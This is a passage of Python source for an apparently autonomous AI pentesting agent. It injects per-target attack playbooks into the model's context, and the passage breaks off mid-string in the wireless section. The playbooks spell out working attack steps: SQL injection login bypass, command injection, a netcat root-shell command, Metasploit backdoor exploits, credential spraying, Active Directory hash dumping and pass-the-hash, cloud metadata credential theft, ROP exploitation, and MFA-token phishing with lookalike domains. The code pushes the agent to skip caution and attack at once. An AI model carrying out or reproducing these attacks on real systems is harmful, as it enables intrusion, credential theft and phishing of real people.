"""
skills_playbook.py — just-in-time skill/playbook injection (Decepticon-inspired).

Mirrors Decepticon's SkillsMiddleware "progressive disclosure": rather than
front-loading every technique into the system prompt, a compact playbook is
injected into context ONLY when the live attack state makes it relevant — so a
weak local model is grounded on the right approach at the right moment without
bloating every call. Matched skills drop back out when no longer relevant.

Each Skill carries a predicate over the AttackState + the user's request; the
controller injects matched bodies each turn (idempotently, alongside the live
state block).
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Any, Callable

# Ports that indicate an HTTP application is in play.
WEB_PORTS = {"80", "443", "3000", "5000", "8000", "8080", "8443", "8888"}

_WEB_HINT_RE = re.compile(
    r"\b(https?|web(site|app)?|api|rest|login|sign[-\s]?in|url|endpoint|portal|"
    r"form|juice[-\s]?shop)\b",
    re.IGNORECASE,
)

# Classic remotely-exploitable / backdoored network services (Metasploitable-class).
# Deliberately EXCLUDES 22/80/443: bare SSH is a cred/brute target, and web ports are
# the web playbook's domain — this playbook is about service-side RCE.
NET_EXPLOIT_PORTS = {
    "21", "23", "25", "111", "139", "445", "512", "513", "514", "1099", "1524",
    "2049", "2121", "3306", "3632", "5432", "5900", "6000", "6200", "6667",
    "8009", "8180",
}

_NET_HINT_RE = re.compile(
    r"\b(metasploitable|metasploit|msf|samba|smb|vsftpd|unreal[-\s]?ircd|distcc|"
    r"ingreslock|backdoor|bind[-\s]?shell|reverse[-\s]?shell|command[-\s]execution|"
    r"remote[-\s]code|rce|root[-\s]shell|get[-\s]a[-\s]shell)\b",
    re.IGNORECASE,
)

# Authenticated services where weak/default/reused creds are a foothold.
CRED_SERVICE_PORTS = {
    "21", "22", "23", "25", "110", "143", "139", "445", "1433", "2121",
    "3306", "3389", "5432", "5900", "8180",
}

_CRED_HINT_RE = re.compile(
    r"\b(passwords?|passwd|brute[-\s]?forc\w*|credentials?|default[-\s]cred\w*|"
    r"weak[-\s]passwords?|spray\w*|hydra|medusa|log[-\s]?in|crack\w*|ssh[-\s]keys?|"
    r"reuse\w*|/etc/shadow|kerberoast\w*)\b",
    re.IGNORECASE,
)


def _bare_ports(state: Any) -> set[str]:
    """Port numbers from AttackState.open_ports, tolerating '445' or '445/tcp'."""
    try:
        return {str(p).split("/")[0] for p in (getattr(state, "open_ports", None) or [])}
    except Exception:
        return set()


@dataclass(frozen=True)
class Skill:
    name: str
    matches: Callable[[Any, str], bool]
    body: str


def _is_web_target(state: Any, user_input: str) -> bool:
    """A web app is in play if a web port is open, the target is a URL, or the
    request itself talks about web/http/login."""
    try:
        ports = {str(p) for p in (getattr(state, "open_ports", None) or [])}
    except Exception:
        ports = set()
    if ports & WEB_PORTS:
        return True
    target = getattr(state, "target", "") or ""
    if target.startswith(("http://", "https://")):
        return True
    if ":" in target and target.rsplit(":", 1)[-1] in WEB_PORTS:
        return True
    return bool(_WEB_HINT_RE.search(user_input or ""))


WEB_ATTACK_SKILL = Skill(
    name="web_app_attacks",
    matches=_is_web_target,
    body=(
        "ACTIVE PLAYBOOK — the target is a web application. This overrides recon-"
        "first: interact with the app directly.\n"
        "TOOLING: use `http_request` (structured JSON — payloads with quotes survive "
        "intact), NOT shell curl. The real attack surface is the REST API + request "
        "parameters, not the static HTML. Do NOT call cve_lookup/web_search on a "
        "modern web app — there are no useful results.\n"
        "PICK THE TECHNIQUE BY OBJECTIVE (don't fixate — if a class comes back clean, "
        "move to the next):\n"
        "- AUTH BYPASS / log in as someone else → SQL injection on the login POST: "
        'json_body {"email": "\' OR 1=1--", "password": "anything"} at, in order, '
        "/rest/user/login, /api/login, /login. Success = an auth token for the admin "
        "(e.g. admin@juice-sh.op).\n"
        "- BROKEN ACCESS CONTROL / IDOR → request another user's/object's resource "
        "directly: change the id in /api/<obj>/<id> or /rest/basket/<id>, hit admin-"
        "only endpoints directly, or forge/swap the JWT / Authorization bearer.\n"
        "- READ A FILE / CONFIDENTIAL DOC → path traversal. GET static paths like "
        "/ftp/<file>; traverse with ../ (URL-encode as %2e%2e%2f). Bypass an "
        "extension filter with a poison null byte %2500 (e.g. "
        "/ftp/package.json.bak%2500.md). Juice Shop's confidential file is "
        "/ftp/acquisitions.md.\n"
        "- RCE / LFI VIA A PARAMETER → test injectable params with command injection "
        "(`; id`, `| id`, `$(id)`), path traversal (../../etc/passwd), and SSTI "
        "({{7*7}} or ${7*7} — a returned 49 confirms).\n"
        "- FILE UPLOAD → upload something the server executes or parses (XML→XXE, or "
        "a webshell when extension filters are weak).\n"
        "- SEARCH / QUERY PARAMS → SQLi or NoSQLi in q=, filter=, orderBy=.\n"
        "PROOF = the objective's actual evidence (an admin token, the file's "
        "contents, the flag) returned by a request YOU issued — never a payload you "
        "did not send."
    ),
)

def _is_network_target(state: Any, user_input: str) -> bool:
    """A service-side exploitation target is in play if a classic exploitable
    non-web service port is open, or the request talks about network RCE / named
    Metasploitable services."""
    if _bare_ports(state) & NET_EXPLOIT_PORTS:
        return True
    return bool(_NET_HINT_RE.search(user_input or ""))


NETWORK_ATTACK_SKILL = Skill(
    name="network_service_exploits",
    matches=_is_network_target,
    body=(
        "ACTIVE PLAYBOOK — the target exposes classic exploitable network services "
        "(Metasploitable-class). Follow this NOW; it overrides recon-first stalling.\n"
        "CONTAINMENT RULE (critical): this is an isolated lab with NO route back to "
        "you. A REVERSE shell can never connect out, so NEVER use a reverse/"
        "meterpreter payload. If a module auto-selects one and demands LHOST, that is "
        "the WRONG payload — switch to a BIND payload (or a direct connect). Do NOT "
        "ask the operator for an LHOST; it does not exist here.\n"
        "1. FASTEST WIN FIRST — some ports are ALREADY a shell, no exploit needed. If "
        "1524 (ingreslock) is open it is an open ROOT shell: your next action should "
        "be `shell` with `(echo id; echo cat <PROOF_FILE>) | nc <target> 1524`. This "
        "is usually the single fastest capture — try it before anything fancier.\n"
        "2. For Metasploit you are in stateless CLI mode: sessions do NOT persist "
        "between calls, so msf_run MUST carry a BIND payload AND a post_cmd in the "
        "SAME call. Reliable no-LHOST vectors (pick by open port):\n"
        "   - SMB 139/445 → msf_run(module='exploit/multi/samba/usermap_script', "
        "payload='cmd/unix/bind_netcat', post_cmd='cat <PROOF_FILE>'). Very reliable.\n"
        "   - IRC 6667 → module='exploit/unix/irc/unreal_ircd_3281_backdoor', "
        "payload='cmd/unix/bind_perl', post_cmd='cat <PROOF_FILE>'.\n"
        "   - distcc 3632 → module='exploit/unix/misc/distcc_exec', "
        "payload='cmd/unix/bind_ruby', post_cmd='cat <PROOF_FILE>'.\n"
        "   - FTP 21 vsftpd 2.3.4 → module='exploit/unix/ftp/vsftpd_234_backdoor'. "
        "NOTE: on current Metasploit its 'cmd/unix/interact' payload is GONE — if "
        "PAYLOAD is rejected, do NOT retry it; move to another vector above.\n"
        "3. DON'T FIXATE. If a module errors twice (invalid payload / failed option "
        "validation), PIVOT to a different service/module — fixating on one broken "
        "vector is the failure mode. The 1524 shell and the samba path are your "
        "highest-confidence fallbacks.\n"
        "4. PROOF = the exact contents of the file you were told to read. Actually "
        "run the read in a shell/session and return the FLAG{...} verbatim — do NOT "
        "answer with a command you did not execute."
    ),
)

def _is_credential_target(state: Any, user_input: str) -> bool:
    """A credential attack is in play if an authenticated service is exposed, or
    the request talks about passwords / brute-force / default creds / login."""
    if _bare_ports(state) & CRED_SERVICE_PORTS:
        return True
    return bool(_CRED_HINT_RE.search(user_input or ""))


CREDENTIAL_ATTACK_SKILL = Skill(
    name="credential_attacks",
    matches=_is_credential_target,
    body=(
        "ACTIVE PLAYBOOK — the target exposes authenticated services, so weak, "
        "default, or reused credentials are often the FASTEST foothold. Follow this "
        "NOW. Only the operator's named target is in scope — never spray other hosts.\n"
        "1. DEFAULT / KNOWN CREDS FIRST — try these before ANY brute-force; on "
        "Metasploitable-class boxes they usually just work: msfadmin:msfadmin, "
        "user:user, service:service, postgres:postgres, root:(blank), "
        "tomcat:tomcat and tomcat:s3cret (Tomcat manager on 8180), mysql root:(blank).\n"
        "2. Your attacker box has NO ssh/ftp/mysql CLIENT installed — do NOT shell out "
        "to `ssh`/`ftp`. Use Metasploit's login scanners via msf_run (stateless CLI "
        "mode: found creds print to the output, and a successful ssh_login also opens "
        "a session):\n"
        "   - SSH 22 → msf_run(module='auxiliary/scanner/ssh/ssh_login', "
        "options='{\"USERNAME\":\"msfadmin\",\"PASSWORD\":\"msfadmin\"}', "
        "post_cmd='cat <PROOF_FILE>')\n"
        "   - SMB 445 → auxiliary/scanner/smb/smb_login (SMBUser/SMBPass or "
        "USER_FILE/PASS_FILE)\n"
        "   - MySQL 3306 → auxiliary/scanner/mysql/mysql_login  |  Postgres 5432 → "
        "auxiliary/scanner/postgres/postgres_login  |  FTP 21 → "
        "auxiliary/scanner/ftp/ftp_login\n"
        "   For a spray, set USER_FILE/PASS_FILE to a SMALL list (echo a few common "
        "creds to a file); keep lists tiny in a lab. Or `kali_run`/`shell` hydra: "
        "`hydra -l <user> -P <list> <target> ssh`.\n"
        "3. FOOTHOLD = authenticate with the creds you found. A successful ssh_login "
        "opens a session — pass post_cmd='cat <PROOF_FILE>' to read the proof in the "
        "SAME call (CLI sessions do not persist between calls).\n"
        "4. POST-EX LOOT → LATERAL: once in, harvest /etc/shadow, DB creds, and SSH "
        "keys, and REUSE found passwords across other services/hosts.\n"
        "5. PROOF = actually authenticate and read the file's contents; return the "
        "FLAG{...} verbatim. Never answer with a credential you did not validate."
    ),
)

# Active Directory / Windows-domain services. Kerberos (88) is the strongest single
# tell; LDAP/GC/WinRM reinforce it. Deliberately does NOT include bare 445/139 (a
# standalone Samba box is the network/credential playbook's domain, not AD).
AD_PORTS = {"88", "389", "636", "3268", "3269", "464", "5985", "5986"}

_AD_HINT_RE = re.compile(
    r"\b(active[-\s]?directory|domain[-\s]?controller|kerberos|kerberoast\w*|"
    r"as[-\s]?rep|bloodhound|ntlm|pass[-\s]?the[-\s]?hash|secretsdump|dcsync|"
    r"golden[-\s]?ticket|net-?exec|crackmapexec|impacket|evil-?winrm|ldap|"
    r"windows[-\s]?domain)\b",
    re.IGNORECASE,
)


def _is_ad_target(state: Any, user_input: str) -> bool:
    """An AD / Windows domain is in play if a domain-service port (Kerberos, LDAP,
    Global Catalog, WinRM) is open, or the request names AD tooling/techniques."""
    if _bare_ports(state) & AD_PORTS:
        return True
    return bool(_AD_HINT_RE.search(user_input or ""))


AD_ATTACK_SKILL = Skill(
    name="active_directory_attacks",
    matches=_is_ad_target,
    body=(
        "ACTIVE PLAYBOOK — an Active Directory / Windows domain is in play "
        "(Kerberos/LDAP/SMB). This is the highest-yield enterprise path; work it in "
        "order. Only the operator's named targets/subnet are in scope.\n"
        "TOOLING: drive Kali tools via kali_run/shell — netexec (nxc) or "
        "crackmapexec, impacket-* (GetNPUsers/GetUserSPNs/secretsdump/psexec), "
        "bloodhound-python, kerbrute, ldapsearch, evil-winrm. Get the DOMAIN name and "
        "a DC IP first (nxc smb <dc>) — most tools need `-d <domain> --dc-ip <ip>`.\n"
        "1. ENUMERATE (works even unauthenticated): `nxc smb <dc> -u '' -p ''` (null "
        "session → users, shares, password policy); `nxc ldap <dc>` / ldapsearch and "
        "`enum4linux-ng <dc>` for users/SPNs. Build a users.txt.\n"
        "2. GET A FIRST CRED (no creds yet): AS-REP roast users without pre-auth — "
        "`impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <ip> -no-pass` → "
        "crack the $krb5asrep$ (hashcat -m 18200). Or PASSWORD SPRAY carefully "
        "(mind lockout): `nxc smb <dc> -u users.txt -p 'Winter2025!' "
        "--continue-on-success`, plus username==password.\n"
        "3. WITH ANY DOMAIN CRED — escalate: KERBEROAST `impacket-GetUserSPNs "
        "<domain>/<user>:<pass> -dc-ip <ip> -request` → crack $krb5tgs$ (-m 13100). "
        "MAP THE GRAPH `bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc> "
        "-c all` → shortest path to Domain Admin (GenericAll/WriteDACL, unconstrained "
        "delegation, DCSync rights). SPRAY the cred across hosts to find local admin "
        "(`nxc smb <subnet> -u <user> -p <pass>` → look for Pwn3d!).\n"
        "4. LATERAL / DUMP: where you're admin — `impacket-secretsdump "
        "<domain>/<user>:<pass>@<host>` (SAM/LSA) or `nxc smb <host> ... --sam --lsa`; "
        "shell via `evil-winrm -i <host> -u <user> -p <pass>` or impacket-psexec/"
        "wmiexec. PASS-THE-HASH with a dumped NTLM: `nxc smb <host> -u <user> "
        "-H <hash>` (no plaintext needed).\n"
        "5. DOMAIN TAKEOVER: with DA or DCSync rights → `impacket-secretsdump "
        "-just-dc <domain>/<user>:<pass>@<dc>` dumps every hash incl. krbtgt "
        "(→ golden ticket = persistent domain control).\n"
        "DON'T FIXATE: if a host/vector is dead, spray the next — BloodHound tells "
        "you where to aim. PROOF = actual tool output (a cracked cred, a shell, a "
        "dumped hash); never invent it."
    ),
)

# --- Cloud (AWS/Azure/GCP/k8s). Keyword/metadata-driven — no single port tell. --- #
_CLOUD_HINT_RE = re.compile(
    r"\b(aws|azure|gcp|s3|ec2|iam|sts|lambda|cloud|bucket|blob|storage[-\s]?account|"
    r"kubernetes|k8s|kubelet|kubectl|eks|aks|gke|metadata|imds|169\.254\.169\.254|"
    r"metadata\.google|assume[-\s]?role|access[-\s]?key|service[-\s]?account|azurerm)\b",
    re.IGNORECASE)


def _is_cloud_target(state: Any, user_input: str) -> bool:
    target = (getattr(state, "target", "") or "").lower()
    if "169.254.169.254" in target or "metadata" in target:
        return True
    return bool(_CLOUD_HINT_RE.search(user_input or ""))


CLOUD_ATTACK_SKILL = Skill(
    name="cloud_attacks",
    matches=_is_cloud_target,
    body=(
        "ACTIVE PLAYBOOK — a CLOUD target is in play (AWS/Azure/GCP/Kubernetes). Drive "
        "provider CLIs via `shell` (aws/az/gcloud/kubectl); stay in the authorized "
        "account/subscription/project.\n"
        "1. WHOAMI + METADATA FIRST — if you have any foothold or SSRF, hit the metadata "
        "service (IMDS) for credentials: AWS `curl http://169.254.169.254/latest/meta-"
        "data/iam/security-credentials/<role>` (or IMDSv2: PUT a token first); GCP "
        "`curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata"
        "/v1/instance/service-accounts/default/token`; Azure IMDS `?api-version=2018-02-01"
        "&resource=https://management.azure.com/`. Then `aws sts get-caller-identity` / "
        "`az account show` / `gcloud auth list` to see who you are.\n"
        "2. PUBLIC STORAGE — list/exfil open buckets: `aws s3 ls s3://<name> --no-sign-"
        "request`, `aws s3 sync s3://<name> . --no-sign-request`; Azure blob `?comp=list`; "
        "GCS `gsutil ls gs://<name>`. Enumerate names from the app/DNS.\n"
        "3. IAM PRIVESC — enumerate your grants (`aws iam get-account-authorization-details`, "
        "list attached policies) and look for the known escalation primitives: iam:Create"
        "Policy(Version), sts:AssumeRole into a stronger role, lambda:UpdateFunctionCode, "
        "iam:PassRole+ec2/lambda, glue/cloudformation. Azure: over-scoped RBAC, Managed "
        "Identity abuse, `az role assignment list`. GCP: `iam.serviceAccounts.actAs`, "
        "`setIamPolicy`, actAs+deploy.\n"
        "4. KUBERNETES — `kubectl auth can-i --list`; hunt exposed kubelets (:10250 "
        "`/run`/`/exec`), the dashboard, and mounted service-account tokens at "
        "`/var/run/secrets/kubernetes.io/serviceaccount/token`; escape a pod to the node "
        "with a privileged/hostPath spec.\n"
        "PROOF = the actual retrieved credential/token, the object contents, or the "
        "sts:get-caller-identity of the escalated principal — never a command you didn't run."
    ),
)


# --- Binary exploitation / pwn (CTF-style). Keyword-driven. ------------------- #
_PWN_HINT_RE = re.compile(
    r"\b(binary|elf|pwn|pwntools|buffer[-\s]?overflow|stack[-\s]?overflow|heap[-\s]?"
    r"overflow|\brop\b|ret2\w+|format[-\s]?string|shellcode|canary|\bnx\b|\bpie\b|\bgot\b|"
    r"\bplt\b|libc|one[-\s]?gadget|ghidra|radare2|\br2\b|\bgdb\b|\bpwndbg\b|disassemble|"
    r"decompile|reverse[-\s]engineer\w*|checksec|segfault)\b",
    re.IGNORECASE)


def _is_pwn_target(state: Any, user_input: str) -> bool:
    return bool(_PWN_HINT_RE.search(user_input or ""))


BINARY_PWN_SKILL = Skill(
    name="binary_exploitation",
    matches=_is_pwn_target,
    body=(
        "ACTIVE PLAYBOOK — BINARY EXPLOITATION / reverse engineering. Work it through "
        "`shell`/`kali_run` with the standard toolchain.\n"
        "1. TRIAGE — `file <bin>`, `checksec --file=<bin>` (note NX / PIE / canary / "
        "RELRO), `strings`, and a quick `ghidra`/`r2 -A`/`objdump -d` pass to find "
        "main + interesting functions (a win()/system() gadget, a gets()/strcpy()).\n"
        "2. FIND THE PRIMITIVE — classic classes: stack buffer overflow (unbounded "
        "read into a fixed buffer), format string (user input reaching printf → leak/"
        "write with %p/%n), use-after-free/heap. Find the exact offset to saved RIP with "
        "a cyclic pattern (`pwndbg` cyclic / cyclic_find).\n"
        "3. BUILD THE EXPLOIT with pwntools: `from pwn import *`. If NX: ROP — leak libc "
        "(puts@plt(puts@got)) → compute base → ret2system('/bin/sh') or a one_gadget. No "
        "PIE + a win() → just overwrite RIP with its address. Mind the stack alignment "
        "(movaps) — add a ret gadget if it crashes in system.\n"
        "4. LOCAL THEN REMOTE — get it working on `p = process('./bin')`, then flip to "
        "`p = remote(host, port)` for the real target. `p.interactive()` to read the flag.\n"
        "PROOF = the flag actually returned by the exploited process — never a payload "
        "you built but did not land."
    ),
)


# --- Mobile (Android / iOS). Keyword-driven. --------------------------------- #
_MOBILE_HINT_RE = re.compile(
    r"\b(apk|android|ios|ipa|frida|objection|jadx|apktool|mobsf|smali|\bdex\b|"
    r"ssl[-\s]?pinning|deep[-\s]?link|webview|exported[-\s]?(activity|component|provider)|"
    r"mobile[-\s]?app|\.plist|keychain|content[-\s]?provider)\b",
    re.IGNORECASE)


def _is_mobile_target(state: Any, user_input: str) -> bool:
    return bool(_MOBILE_HINT_RE.search(user_input or ""))


MOBILE_ATTACK_SKILL = Skill(
    name="mobile_attacks",
    matches=_is_mobile_target,
    body=(
        "ACTIVE PLAYBOOK — MOBILE APP (Android/iOS) attack. Drive the toolchain via "
        "`shell`/`kali_run`.\n"
        "1. STATIC FIRST — Android: `apktool d app.apk` (manifest + smali) and `jadx -d "
        "out app.apk` (Java). Read AndroidManifest.xml for exported activities/services/"
        "receivers/providers (`android:exported=true`), deep-link schemes, "
        "usesCleartextTraffic, and the networkSecurityConfig. Grep the decompiled source "
        "for secrets/API keys/endpoints/hardcoded creds. iOS: unzip the .ipa, `class-dump`/"
        "Hopper the binary, read Info.plist + embedded.mobileprovision.\n"
        "2. EXPORTED-COMPONENT ABUSE — invoke exported components directly with `adb shell "
        "am start`/`am startservice`/`content` (or a malicious app) to bypass auth, reach "
        "internal screens, or hit an exported ContentProvider for SQLi/file read.\n"
        "3. DYNAMIC — run with Frida/Objection: `objection -g <pkg> explore` for SSL-"
        "pinning + root/jailbreak-detection bypass, or a custom `frida -U -f <pkg>` hook "
        "to tamper with logic and dump runtime secrets. Proxy traffic (Burp) after "
        "unpinning to test the API.\n"
        "4. WEBVIEW — if a WebView loads attacker-influenced content with a JS bridge "
        "(addJavascriptInterface), that bridge is RCE-in-app; test it.\n"
        "PROOF = the actual secret/flag extracted or the concrete bypass demonstrated."
    ),
)


# --- Social engineering / phishing. Keyword-driven; deconfliction-gated. ------ #
_SE_HINT_RE = re.compile(
    r"\b(phish\w*|spear[-\s]?phish\w*|gophish|evilginx|pretext\w*|social[-\s]engineer\w*|"
    r"\blure\b|credential[-\s]harvest\w*|oauth[-\s]?device|device[-\s]?code|smishing|"
    r"vishing|lookalike[-\s]?domain|typosquat\w*|pretexting)\b",
    re.IGNORECASE)


def _is_se_target(state: Any, user_input: str) -> bool:
    return bool(_SE_HINT_RE.search(user_input or ""))


SOCIAL_ENGINEERING_SKILL = Skill(
    name="social_engineering",
    matches=_is_se_target,
    body=(
        "ACTIVE PLAYBOOK — SOCIAL ENGINEERING / phishing (MITRE T1566). DECONFLICT FIRST: "
        "confirm the campaign, sender domains, and target list are IN SCOPE and the blue "
        "team is deconflicted BEFORE anything is sent — this is mandatory.\n"
        "1. PRETEXT + INFRA — build a credible lure from OSINT (org, roles, current "
        "events); register a lookalike/typosquat domain, warm it, and set SPF/DKIM/DMARC "
        "so it lands. Host the phishing page and a redirector.\n"
        "2. CREDENTIAL / TOKEN CAPTURE — GoPhish for classic credential-harvest campaigns "
        "with tracked links. For MFA-protected targets use a reverse-proxy (evilginx2) to "
        "capture the SESSION COOKIE/token, not just the password — a harvested password "
        "alone won't beat MFA. For M365/Azure, the OAuth device-code flow is high-yield: "
        "start a device-code auth and phish the user into entering the code.\n"
        "3. PAYLOAD DELIVERY (if in scope) — ISO/LNK/HTA or a macro-less Office vector; "
        "pair with a C2 the engagement authorizes. Otherwise stop at credential/token "
        "capture and validated access.\n"
        "4. VALIDATE — log in with the captured credential/token to PROVE access; note "
        "who clicked/submitted for the report.\n"
        "PROOF = a captured credential/session token you actually authenticated with, or "
        "the recorded click/submit — never a lure you merely drafted."
    ),
)


# --- Smart contracts / Web3 (Solidity/EVM). Keyword-driven. ------------------ #
_WEB3_HINT_RE = re.compile(
    r"\b(solidity|\bevm\b|smart[-\s]?contract|reentran\w*|erc[-\s]?(20|721|1155)|\bdefi\b|"
    r"flash[-\s]?loan|web3|blockchain|ethereum|slither|mythril|foundry|hardhat|"
    r"delegatecall|selfdestruct|oracle[-\s]?manipulation|\babi\b|\bdapp\b)\b",
    re.IGNORECASE)


def _is_web3_target(state: Any, user_input: str) -> bool:
    return bool(_WEB3_HINT_RE.search(user_input or ""))


WEB3_ATTACK_SKILL = Skill(
    name="smart_contract_attacks",
    matches=_is_web3_target,
    body=(
        "ACTIVE PLAYBOOK — SMART CONTRACT / Web3 (Solidity/EVM) audit. Reason over the "
        "source and run analyzers through `shell` (slither, mythril, foundry).\n"
        "1. GET THE SOURCE + STATE — verified source from the explorer, or decompile "
        "bytecode. Note compiler version, who is `owner`/admin, upgradeability (proxy/"
        "delegatecall), and where value flows.\n"
        "2. RUN STATIC ANALYSIS — `slither .` and `myth analyze <file>`; triage the "
        "findings, don't trust them blindly.\n"
        "3. HUNT THE HIGH-IMPACT CLASSES: reentrancy (external call before state update "
        "— check-effects-interactions violated); broken access control (missing "
        "onlyOwner, unprotected init/selfdestruct, tx.origin auth); oracle/price "
        "manipulation + flash-loan-amplified logic; unchecked arithmetic/return values; "
        "delegatecall to attacker-controlled code; signature replay (missing nonce/"
        "chainid). \n"
        "4. PROVE IT — write a Foundry PoC test (`forge test`) that drains funds or "
        "seizes ownership on a fork; that exploit test IS the evidence.\n"
        "PROOF = a passing PoC exploit (funds moved / ownership taken) — not a "
        "theoretical finding."
    ),
)


# --- Supply chain (dependencies / CI / packages). Keyword-driven. ------------ #
_SUPPLY_HINT_RE = re.compile(
    r"\b(supply[-\s]?chain|dependency[-\s]?confusion|typosquat\w*[-\s]?package|npm|pypi|"
    r"pip[-\s]?install|package[-\s]?registry|ci/?cd|pipeline|github[-\s]?actions|\bsbom\b|"
    r"lock[-\s]?file|package\.json|requirements\.txt|malicious[-\s]?package|build[-\s]?"
    r"pipeline|artifact[-\s]?integrity)\b",
    re.IGNORECASE)


def _is_supply_target(state: Any, user_input: str) -> bool:
    return bool(_SUPPLY_HINT_RE.search(user_input or ""))


SUPPLY_CHAIN_SKILL = Skill(
    name="supply_chain_attacks",
    matches=_is_supply_target,
    body=(
        "ACTIVE PLAYBOOK — SUPPLY-CHAIN attack surface (dependencies, build, packages). "
        "Only touch registries/repos/pipelines that are IN SCOPE.\n"
        "1. MAP DEPENDENCIES — read package.json/requirements.txt/go.mod/pom.xml + the "
        "lockfile; list direct + transitive deps and pin state. Look for INTERNAL package "
        "names resolvable from a PUBLIC registry (dependency-confusion) and for install/"
        "postinstall scripts.\n"
        "2. TYPOSQUAT / CONFUSION — a private dep name unclaimed on npm/PyPI is a "
        "dependency-confusion foothold; a near-miss of a popular name is a typosquat "
        "target. (Publish/claim only with explicit authorization.)\n"
        "3. CI/CD — inspect GitHub Actions / GitLab CI: unpinned third-party actions "
        "(`uses: x@main`), secrets exposed to PRs (pull_request_target), self-hosted "
        "runner takeover, and injectable workflow inputs (`${{ github.event.* }}` into a "
        "run step = command injection in CI).\n"
        "4. INTEGRITY — check signatures/provenance (SBOM, Sigstore, checksums); a "
        "missing/forgeable integrity check is the tampering vector.\n"
        "PROOF = a concrete foothold: an unclaimed internal package name, an injectable "
        "workflow, a leaked CI secret, or a malicious-build path — demonstrated, not assumed."
    ),
)


# --- ICS / OT / SCADA. Protocol ports + keywords. ---------------------------- #
ICS_PORTS = {"502", "20000", "102", "44818", "47808", "4840", "2404", "789"}
_ICS_HINT_RE = re.compile(
    r"\b(\bics\b|scada|\bot\b|\bplc\b|modbus|dnp3|s7comm|\bs7\b|bacnet|opc[-\s]?ua|\bhmi\b|"
    r"historian|purdue|iec[-\s]?61850|profinet|ethernet/?ip|rockwell|siemens[-\s]?s7)\b",
    re.IGNORECASE)


def _is_ics_target(state: Any, user_input: str) -> bool:
    if _bare_ports(state) & ICS_PORTS:
        return True
    return bool(_ICS_HINT_RE.search(user_input or ""))


ICS_ATTACK_SKILL = Skill(
    name="ics_ot_attacks",
    matches=_is_ics_target,
    body=(
        "ACTIVE PLAYBOOK — ICS / OT / SCADA. SAFETY FIRST: these control physical "
        "processes — stay READ-ONLY and passive unless the RoE explicitly authorizes "
        "writes; a careless write can trip or damage equipment. Deconflict with the "
        "process owner.\n"
        "1. IDENTIFY, DON'T DISRUPT — passive fingerprint the protocol/port: Modbus/TCP "
        "502, DNP3 20000, S7comm 102, EtherNet/IP 44818, BACnet 47808, OPC-UA 4840, "
        "IEC-104 2404. Use `nmap` with the ICS NSE scripts (`s7-info`, `modbus-discover`, "
        "`bacnet-info`) at low rate, and PLC-safe tools (plcscan, the Metasploit "
        "scanner/scada modules) for enumeration only.\n"
        "2. ENUMERATE — read device identity, registers/coils (Modbus read), tags, and "
        "logic metadata to map the process. `nmap -sV` + protocol read requests.\n"
        "3. ASSESS — default/hardcoded creds on the HMI/engineering workstation, exposed "
        "historians, unauthenticated protocol writes, and known PLC CVEs (searchsploit "
        "the exact model/firmware).\n"
        "4. WRITES ONLY IF AUTHORIZED — any coil/register/logic write is high-risk; do it "
        "only with signed-off RoE and process-owner presence.\n"
        "PROOF = the enumerated process map / identified weakness (default cred, exposed "
        "write) — demonstrated read-only wherever possible."
    ),
)


# --- IoT / embedded / firmware. Ports + keywords. ---------------------------- #
IOT_PORTS = {"1883", "8883", "5683", "554", "5000", "37777", "9999", "1900"}
_IOT_HINT_RE = re.compile(
    r"\b(\biot\b|firmware|embedded|\buart\b|\bjtag\b|\bspi\b[-\s]?flash|binwalk|squashfs|"
    r"u-?boot|serial[-\s]?console|bootloader|busybox|\bmqtt\b|\bcoap\b|\bupnp\b|\brtsp\b|"
    r"\brtos\b|\bota\b[-\s]?update|hardcoded[-\s]?cred\w*)\b",
    re.IGNORECASE)


def _is_iot_target(state: Any, user_input: str) -> bool:
    if _bare_ports(state) & IOT_PORTS:
        return True
    return bool(_IOT_HINT_RE.search(user_input or ""))


IOT_ATTACK_SKILL = Skill(
    name="iot_firmware_attacks",
    matches=_is_iot_target,
    body=(
        "ACTIVE PLAYBOOK — IoT / EMBEDDED / firmware. Software analysis runs via `shell`/"
        "`kali_run`; anything needing UART/JTAG/SPI or a radio needs physical hardware.\n"
        "1. FIRMWARE EXTRACTION — `binwalk -e firmware.bin` (or `unblob`); mount the "
        "extracted squashfs/jffs2 root. If binwalk can't carve it, check for encryption/"
        "custom packing and pull it from an OTA endpoint or SPI flash dump.\n"
        "2. HUNT SECRETS + WEAK AUTH — grep the rootfs for hardcoded creds, API keys, "
        "private keys, and backdoor accounts (`/etc/passwd`, `/etc/shadow`, config, "
        "certs). `firmwalker`; extract the web UI + CGI binaries.\n"
        "3. ANALYZE THE BINARIES — the httpd/CGI/service binaries: command injection in "
        "CGI params, unauthenticated endpoints, and memory-corruption (see the "
        "binary_exploitation playbook for the pwn path; MIPS/ARM cross-arch).\n"
        "4. NETWORK SERVICES — probe MQTT 1883 (anonymous publish/subscribe → control), "
        "CoAP 5683, UPnP 1900 (exposed actions), RTSP 554 (default-cred camera streams), "
        "and vendor ports (Dahua 37777, etc.).\n"
        "5. HARDWARE (needs a device) — UART root shell via a serial adapter, JTAG/SWD "
        "halt-and-dump, SPI-flash read with a clip.\n"
        "PROOF = an extracted secret/cred, an injectable endpoint, or a shell on the device."
    ),
)


# --- Wireless / RF (needs hardware). Keyword-driven. ------------------------- #
_WIRELESS_HINT_RE = re.compile(
    r"\b(wi-?fi|wpa[-\s]?[23]?|\bwps\b|deauth\w*|aircrack|evil[-\s]?twin|\bpmkid\b|"
    r"handshake|802\.11|\bble\b|bluetooth|zigbee|z-wave|sub-?ghz|\brfid\b|\bnfc\b|\bsdr\b|"
    r"hackrf|\brtl-?sdr\b|gnuradio|hostapd|wifiphisher)\b",
    re.IGNORECASE)


def _is_wireless_target(state: Any, user_input: str) -> bool:
    return bool(_WIRELESS_HINT_RE.search(user_input or ""))


WIRELESS_ATTACK_SKILL = Skill(
    name="wireless_attacks",
    matches=_is_wireless_target,
    body=(
        "ACTIVE PLAYBOOK — WIRELESS / RF. NEEDS PHYSICAL HARDWARE: a monitor-mode Wi-Fi "
        "adapter, a BLE dongle, or an SDR (HackRF/RTL-SDR) — say so if none is present. "
        "Only attack RADIOS/SSIDs that are in scope.\n"
        "1. Wi-Fi — `airmon-ng` monitor mode; `airodump-ng` to survey BSSIDs/clients/"
        "encryption. WPA2: capture the 4-way handshake (or a PMKID with hcxdumptool), "
        "then crack offline (`hashcat -m 22000`). WPS: `reaver`/`bully`. Rogue AP / evil "
        "twin with hostapd + a captive portal for credential capture (in scope only).\n"
